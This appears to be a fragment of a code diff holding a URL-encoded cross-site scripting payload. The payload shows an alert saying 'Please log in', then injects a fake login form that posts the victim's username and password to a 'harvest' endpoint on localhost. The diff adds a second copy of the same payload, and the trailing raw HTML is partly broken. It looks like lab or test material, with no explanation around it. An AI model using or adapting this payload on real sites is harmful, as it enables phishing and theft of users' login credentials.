@@ -1,5 +1,12 @@
 encodeURIComponent("<script>alert('Please log in');</script><h3>LOGIN</h3><form action='http://localhost:8080/harvest-coachwebapp-springapp/validate' method='post' target='_blank'><label for='username'>Username:</label><input type='text' name='username' id='username'/><label for='password'>Password:</label><input type='password' name='password' id='password'/><input type='submit' value='OK'></form>");
 
+
+
+
+
+
+
+encodeURIComponent("<script>alert('Please log in');</script><h3>LOGIN</h3><form action='http://localhost:8080/harvest-coachwebapp-springapp/validate' method='post' target='_blank'><label for='username'>Username:</label><input type='text' name='username' id='username'/><label for='password'>Password:</label><input type='password' name='password' id='password'/><input type='submit' value='OK'></form>");
 h3>LOGIN</h3>  
 <form action="http://localhost:8080/harvest-coachweb-springapp/validate"  method=post  target="_blank">  
 <label for="username">Username:</label>  
